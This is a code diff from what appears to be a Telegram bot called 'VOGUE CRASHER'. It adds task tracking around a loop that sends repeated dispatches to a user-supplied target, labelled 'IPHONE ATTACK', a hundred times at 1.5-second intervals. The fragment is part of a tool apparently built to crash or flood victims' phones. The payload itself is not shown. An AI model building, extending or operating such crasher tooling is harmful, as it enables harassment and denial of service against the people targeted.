@@ -2233,6 +2233,19 @@ Status      : Success
         });
         
         setImmediate(async () => {
+            const instanceId = Date.now() + Math.random();
+
+            createTask(
+                instanceId,
+                {
+                    target: q,
+            
+                    type: "IPHONE ATTACK",
+            
+                    user:
+                        ctx.from.first_name
+                }
+            );
             for (let i = 0; i < 100; i++) {
                 
                 try {
@@ -2244,13 +2257,14 @@ Status      : Success
                     console.log(
                         `[VOGUE CRASHER] Dispatch Error: ${e.message}`
                     );
+                    completeTask(instanceId);
                     autoRestartOn408(e);
                 }
                 
                 await sleep(1500);
             }
            
-            
+            completeTask(instanceId);
             console.log(
                 `[VOGUE CRASHER] Execution completed successfully for ${q}`
             );
